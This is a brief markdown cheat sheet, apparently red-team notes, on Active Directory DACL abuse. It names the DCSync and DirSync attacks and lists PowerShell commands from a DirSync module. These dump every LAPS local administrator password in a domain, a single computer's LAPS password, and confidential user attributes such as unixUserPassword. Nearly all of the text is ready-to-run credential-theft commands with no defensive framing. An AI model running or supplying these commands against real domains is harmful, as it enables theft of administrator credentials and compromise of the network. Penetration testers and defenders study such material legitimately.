# DACL Attacks on the domain/forest

## 1) DS-Replication-Get-Changes + DS-Replication-Get-Changes-All

DCSync Attack

## 2) DS-Replication-Get-Changes + DS-Replication-Get-Changes-In-Filtered-Set

DirSync Attack

Import-Module ./DirSync.psm1

##### Sync all the LAPS passwords in the domain

    Sync-LAPS

##### Sync a specific LAPS password

    Sync-LAPS -LDAPFilter '(samaccountname=<computer$>)'

##### Sync confidential attributs

    Sync-Attributes -LDAPFilter '(samaccountname=user1)' -Attributes unixUserPassword,description
